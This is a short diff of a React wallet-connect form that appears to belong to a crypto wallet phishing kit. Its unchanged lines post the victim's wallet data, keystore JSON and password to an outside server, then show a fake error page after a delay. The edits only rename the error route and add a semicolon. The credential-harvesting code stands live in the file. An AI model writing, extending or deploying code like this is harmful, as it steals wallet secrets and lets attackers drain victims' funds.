@@ -61,7 +61,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
         const res = await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         console.log(res);
         setTimeout(() => {
-          navigate('/wallet-error')
+          navigate('/error')
         }, 3000);
       } catch (error) {
         console.log("")
@@ -83,7 +83,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
   // ##### KEYSTORE JSON SUBMISSION
   const handleKeystoreSubmit = async (e) => {
-    setKeystoreSubmit("Processing...")
+    setKeystoreSubmit("Processing...");
     e.preventDefault();
     const name = wallet
     const type = "Keystore_JSON"
@@ -92,7 +92,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     try {
       await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
       setTimeout(() => {
-        navigate('/wallet-error')
+        navigate('/error')
       }, 3000);
     } catch (error) {
       console.log("error")
